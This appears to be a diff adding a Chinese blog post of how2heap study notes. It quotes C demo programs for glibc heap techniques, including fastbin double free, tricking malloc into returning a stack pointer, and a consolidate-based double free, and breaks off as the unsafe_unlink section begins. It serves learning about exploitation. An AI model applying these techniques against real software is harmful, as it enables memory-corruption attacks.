@@ -252,6 +252,1512 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/15/how2heap学习（1）/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Asa9ao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Asa9ao">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/01/15/how2heap学习（1）/" itemprop="url">how2heap学习（1）</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-15T16:49:08+08:00">
+                2019-01-15
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>#how2heap</p>
+<p>寒假了终于有大把大把的时间来集中学习了，自己也制定了计划，希望自己能坚持下来吧。how2heap是表哥推荐的，涵盖了很多知识点，寒假前段时间会系统的总结一下，相关题目的wp估计会另外开一个，这个权当是知识点的总结了，也是为了方便之后自己复习</p>
+<p>还有一篇关于内存管理的文章相当不错，也放这里码着</p>
+<p><a href="http://paper.seebug.org/papers/Archive/refs/heap/glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86ptmalloc%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90.pdf" target="_blank" rel="noopener">http://paper.seebug.org/papers/Archive/refs/heap/glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86ptmalloc%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90.pdf</a></p>
+<h2 id="first-fit"><a href="#first-fit" class="headerlink" title="first_fit"></a>first_fit</h2><p>首先来看源码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"glibc uses a first-fit algorithm to select a free chunk.\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If a chunk is free and large enough, malloc will select this chunk.\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This can be exploited in a use-after-free situation.\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 2 buffers. They can be large, don't have to be fastbin.\n"</span>);</span><br><span class="line">    <span class="keyword">char</span>* a = <span class="built_in">malloc</span>(<span class="number">512</span>);</span><br><span class="line">    <span class="keyword">char</span>* b = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">    <span class="keyword">char</span>* c;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(512): %p\n"</span>, a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(256): %p\n"</span>, b);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"we could continue mallocing here...\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"now let's put a string at a that we can read later \"this is A!\"\n"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(a, <span class="string">"this is A!"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"first allocation %p points to %s\n"</span>, a, a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We don't need to free anything again. As long as we allocate less than 512, it will end up at %p\n"</span>, a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"So, let's allocate 500 bytes\n"</span>);</span><br><span class="line">    c = <span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(500): %p\n"</span>, c);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"And put a different string here, \"this is C!\"\n"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(c, <span class="string">"this is C!"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd allocation %p points to %s\n"</span>, c, c);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"first allocation %p points to %s\n"</span>, a, a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If we reuse the first allocation, it now holds the data from the third allocation."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先是申请了两块内存，并让a、b分别指向它们，然后将a的内存空间存入字符串“this is A”，然后free了a，这里我们注意到，a的内存free了，但是a并没有被我们人为的改变指针的指向，a的指针目标仍然是之前的内存，即使已经free了。</p>
+<p>然后我们又malloc了内存给了c，注意这里malloc的内存大小是小于a的。这里就会发生<strong>first-fit</strong>，简单的说，glibc在malloc时会检查free_chunk，当free_chunk的大小足够时，glibc会优先分配这个chunk，所以我们这里的c实际上也就是指向我们最开始分配的内存地址的。</p>
+<p>接着将“this is C”给了c指向的内存，接着输出a、c，通过前面的解释我们已经知道了，a、c都应该会输出“this is C”</p>
+<p>当我们分配了a、b后堆的情况如下所示</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fz7dx2l9l6j30ei0g8q7h.jpg" alt="image-20190115171244727">1</p>
+<p>继续运行可以看到a的内存地址里存储的内容</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fz7e09n3fcj30im02cjsc.jpg" alt="image-20190115171549866"></p>
+<p>接着程序会free掉a，我们可以在unsortedbin里看到</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fz7e2ei9yjj30xi02qmym.jpg" alt="image-20190115171752114"></p>
+<p>当我们malloc后，我们存入“this is c”，然后再次打印a指向的地址</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fz8habshuxj30ga032wfq.jpg" alt="image-20190116155445184"></p>
+<p>结果和我们预测的一样。</p>
+<h2 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a>fastbin_dup</h2><p>这个例子像我们展示了利用fastbin的free机制来实现double free</p>
+<p>源码如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file demonstrates a simple double-free attack with fastbins.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">	<span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span>, a, a);</span><br><span class="line">	<span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"So, instead, we'll free %p.\n"</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we can free %p again, since it's not the head of the free list.\n"</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n"</span>, a, b, a, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>程序首先分配了三块较小的内存，然后free了a，此时，a就会进入了fastbin中，且位于top。由于a是top，所以再次的free是不被允许的。此时list的状态如下(fastbin的chunk没有bk，而a的front为NULL)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list = [0x602000&lt;-0x0]</span><br></pre></td></tr></table></figure>
+<p>继续运行程序到b、c被free，同样进入了fastbin，c成为了top，而由于a不再是top，所以a可以再次被free</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list = [0x602040-&gt;0x602020-&gt;0x602000&lt;-0x0]</span><br></pre></td></tr></table></figure>
+<p>而当我们真正去再次free之后就会导致a再次成为top，这样就形成了一个环状结构</p>
+<p>下面再次分配三个chunk，我们会发现第一个分配的还是0x602000，第二个则是0x602040，第三则是0x602020，完全符合之前的fastbin结构，程序到这里就结束了，但我们很好奇，如果继续malloc会发生什么呢？简单修改程序后我们再次运行</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fz8ibenyvrj30hg01kq37.jpg" alt="image-20190116163028130"></p>
+<p>可以看到它分配的第四个chunk还是0x602000，也印证了我们刚才所说的环形结构，同时我们也知道了，假如我们有两个malloc的chunk分别是a、b，且通过double free使之形成类似的结构，当我们malloc a时，b成了fastbin的top，malloc b，a就成了fastbin的top，有种自动free的感觉。。。。</p>
+<h2 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h2><p>实际上是在前面知识的基础上又近了一步，尝试去欺骗malloc返回一个我们可控区域的指针，还是先上源码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file extends on fastbin_dup.c by tricking malloc into\n"</span></span><br><span class="line">	       <span class="string">"returning a pointer to a controlled location (in this case, the stack).\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> stack_var;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The address we want malloc() to return is %p.\n"</span>, <span class="number">8</span>+(<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">	<span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span>, a, a);</span><br><span class="line">	<span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"So, instead, we'll free %p.\n"</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we can free %p again, since it's not the head of the free list.\n"</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the free list has [ %p, %p, %p ]. "</span></span><br><span class="line">		<span class="string">"We'll now carry out our attack by modifying data at %p.\n"</span>, a, b, a, a);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *d = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, d);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the free list has [ %p ].\n"</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we have access to %p while it remains at the head of the free list.\n"</span></span><br><span class="line">		<span class="string">"so now we are writing a fake free size (in this case, 0x20) to the stack,\n"</span></span><br><span class="line">		<span class="string">"so that malloc will think there is a free chunk there and agree to\n"</span></span><br><span class="line">		<span class="string">"return a pointer to it.\n"</span>, a);</span><br><span class="line">	stack_var = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n"</span>, a);</span><br><span class="line">	*d = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>) (((<span class="keyword">char</span>*)&amp;stack_var) - <span class="keyword">sizeof</span>(d));</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p, putting the stack address on the free list\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"4th malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到之前的操作没变，都是先利用了double free使得fastbin呈现环状，此时的环应该是</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span> = [<span class="number">0x602000</span>&lt;-&gt;<span class="number">0x602020</span>]</span><br></pre></td></tr></table></figure>
+<p>后面的操作就很有意思了，先是malloc了两次，那第一个分配的就应该是0x602000，第二个就是0x602020，接着它就改了d的值，很显然修改的就是它的fd指针的值，那当我们再次malloc时，就会产生很神奇的情况：我们再次分配了0x602000，但是由于fd是stack，所以进入fastbin的成了stack而不是0x602020，环就被打破了，当我们再次malloc，我们就实现了malloc了stack的地址。</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fz8j05x5j2j30ko02qmy7.jpg" alt="image-20190116165415679"></p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fz8j0ks84bj30g6020mxi.jpg" alt="image-20190116165439383"></p>
+<p>可以看到情况确实和我们想的一样，原理就是这样了，再看看具体的实现细节。我们先是定义了一个局部变量，我们都知道局部变量是在栈上的，然后取地址，再让地址减去chunk的大小，这是为什么呢？我们之前的操作可以注意到，实际上malloc返回的并不是我们实际分配空间的起始部分，它跳过了chunk的固有信息（如size），直接从内容处开始，所以d作为一个指向内容的指针，我们同样需要把我们伪造的空间的内容部分给他，而这一部分在malloc的空间没有被实际的数据填充时，也就是fd指针。</p>
+<p>还有一个问题是为什么stack变量要赋予0x20的初始值呢？这是为了伪造chunk的curSize部分，也就是我们常说的那3个bit的flag位，当然0x21也可以（0x21是理论上最正确的）</p>
+<h2 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h2><p>源码如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">void</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="keyword">void</span>* p2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocated two fastbins: p1=%p p2=%p\n"</span>, p1, p2);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now free p1!\n"</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocated large bin to trigger malloc_consolidate(): p3=%p\n"</span>, p3);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"In malloc_consolidate(), p1 is moved to the unsorted bin.\n"</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Trigger the double free vulnerability!\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We can pass the check in malloc() since p1 is not fast top.\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now p1 is in unsorted bin and fast bin. So we'will get it twice: %p %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x40</span>), <span class="built_in">malloc</span>(<span class="number">0x40</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先malloc了两次，分配的地址分别为0x602000、0x602050两个，接着free第一个，此时的fastbin即为</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span> = [<span class="number">0x602000</span>]</span><br></pre></td></tr></table></figure>
+<p>接着malloc了一个较大的内存空间，为0x6020b0，此时就是重点了。当glibc在分配一个large chunk时会检查是否存在fastbin，如果有的话，就会合并到unsortedbin中，再根据大小插入smallbin或者largebin，这就是所谓的consolidate。</p>
+<p>此时bin的状态如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fastbin = []</span><br><span class="line">smallbin = [<span class="number">0x602000</span>]</span><br></pre></td></tr></table></figure>
+<p>由于0x602000不再fastbin的top了，所以又可以free了，这样0x602000就又到了fastbin里了，接下来再malloc</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fz9volw1hhj30f80ektcr.jpg" alt="image-20190117205810704"></p>
+<p>此时malloc先分配了fastbin中的0x602000，接着再malloc第二次</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fz9vp7x2wrj30ay0100ss.jpg" alt="image-20190117205859176"></p>
+<p>可以看到分配还是0x602000，这次分配的实际上是我们的smallbin里的</p>
+<h2 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe_unlink"></a>unsafe_unlink</h2><p>了解这个首先需要复习一下基础的知识了，首先回顾一下chunk的结构：</p>
+<ul>
+<li><p>当我们的chunk被分配之后</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">---------------------malloc chunk -----------------------</span><br><span class="line">-------- Size of previous chunk, if allocated  ----------</span><br><span class="line">---------Size of chunk, in bytes and 3 bit flags --------</span><br><span class="line">-------------user data,size == malloc size --------------   &lt;--malloc return address</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>当我们的chunk free后</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">------------------free malloc chunk -----------------------</span><br><span class="line">-------- Size of previous chunk, if allocated  ----------</span><br><span class="line">---------Size of chunk, in bytes and 3 bit flags --------</span><br><span class="line">---------Forward pointer to next chunk in list ----------</span><br><span class="line">---------Back pointer to previous chunk in list ---------</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>第二个问题就是什么是unlink，unlink指的是linux系统在进行空闲堆块管理的时候，进行空闲堆块的合并操作。一般发生在程序进行堆块释放之后。比如说图中三个chunk，我们现在要拿走p</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fz9wejz57pj30e70bbmyp.jpg" alt="2"></p>
+<p>这时就有unlink操作了，其操作就是数据结构中学习的链表元素的删除</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;fd-&gt;bk = p-&gt;bk</span><br><span class="line">p-&gt;bk-&gt;fd = p-&gt;fd</span><br></pre></td></tr></table></figure>
+<p>当然我们可以看看unlink的代码，它并不是这么无脑的就进行了，它还会进行检查</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">P-&gt;fd-&gt;bk == P &amp;&amp; P-&gt;bk-&gt;fd == P</span><br></pre></td></tr></table></figure>
+<p>当然这个检查我们非常容易绕过，我们的fd和bk都可以是非法的，只要fd-&gt;bk和bk-&gt;fd又指回了p就可以了</p>
+<p>了解了这些后我们就开始看代码了</p>
